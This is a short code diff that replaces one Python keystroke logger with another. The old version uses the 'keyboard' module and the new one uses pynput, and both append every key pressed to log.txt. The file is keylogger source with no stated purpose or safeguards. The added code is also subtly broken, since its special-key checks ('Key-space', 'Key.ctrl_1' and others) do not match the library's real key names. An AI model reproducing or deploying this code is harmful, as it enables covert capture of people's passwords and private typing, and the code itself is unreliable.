@@ -1,9 +1,16 @@
-import keyboard
-
-def on_key_press(event):
-    key = event.name
-    with open("log.txt", "a") as file:
-        file.write(key + "\n")
-
-keyboard.on_press(on_key_press)
-keyboard.wait()
+from pynput.keyboard import Listener
+def write_to_file(key) :
+    letter = str (key)
+    letter = letter.replace ("'","")
+    if letter == 'Key-space' :
+        letter = ' '
+    if letter == 'Key shift_r':
+        letter = ''
+    if letter == "Key.ctrl_1":
+        letter = ""
+    if letter == "Key-enter":
+        letter = "\n"
+    with open ("log.txt", 'a') as f:
+        f.write(letter)
+with Listener (on_press=write_to_file) as l:
+    l.join()
